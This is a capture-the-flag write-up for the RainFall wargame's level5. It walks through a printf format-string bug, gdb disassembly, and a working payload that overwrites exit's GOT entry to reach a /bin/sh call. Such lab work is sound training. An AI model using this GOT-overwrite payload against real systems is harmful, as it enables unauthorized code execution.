The program at this level contains a critical "Format String" vulnerability within the `n()` function, located in the `level5.c` source file.

**Vulnerable Code Block (`sources/level5.c`):**

```c
void n(void)
{
    char    buffer[520];

    fgets(buffer, 0x200, stdin); 
    printf(buffer);              // Input is used directly as a format string (VULNERABILITY)
    exit(1);
}
```

The `printf` function expects a format string as its first argument. However, when the user-supplied `buffer` variable is passed directly as this argument, an attacker can use `printf`'s special format specifiers (`%s`, `%x`, `%n`, etc.) to read from and write to the program's memory.

## Exploitation

Our goal is to disrupt the normal flow of the program to execute the `o()` function, which provides us with a shell (`/bin/sh`).

**Target Function:**

```c
void o(void)
{
    system("/bin/sh");
    _exit(1);
}
```

To achieve this, we will use the `printf` vulnerability to overwrite the address of the `exit()` function in the Global Offset Table (GOT) with the address of the `o()` function. This way, when `exit()` is called at the end of the `n()` function, the `o()` function will be executed instead, and we will get a shell.

```diff
+level5@RainFall:~$ gdb ./level5
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
+(gdb) b main
Breakpoint 1 at 0x8048507
+(gdb) r
Starting program: /home/user/level5/level5

Breakpoint 1, 0x08048507 in main ()
+(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
+   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
+(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

In short, as we see in the exit function here, we are calling an entry in a ‘trampoline’ or ‘redirect’ table called @plt (Procedure Linkage Table). We are using the **jmp** memory address.

```
level5@RainFall:~$ echo "AAAA%1\$x.%2\$x.%3\$x.%4\$x.%5\$x" | ./level5
AAAA200.b7fd1ac0.b7ff37d0.41414141.78243125
```

```diff
+(gdb) disas o
Dump of assembler code for function o:
+   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```
Here we see the memory address of that **o** function.
```
hexadecimal =  0x080484a4
decimal =   134513828
```

```sh
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat -) | ./level5
```

When the payload is executed, the `printf` function writes the address of the `o()` function (`0x080484a4`) to the `exit@got.plt` address (`0x08049838`). Subsequently, when the program calls `exit()`, the `o()` function is actually executed, and the attacker obtains a command-line shell.

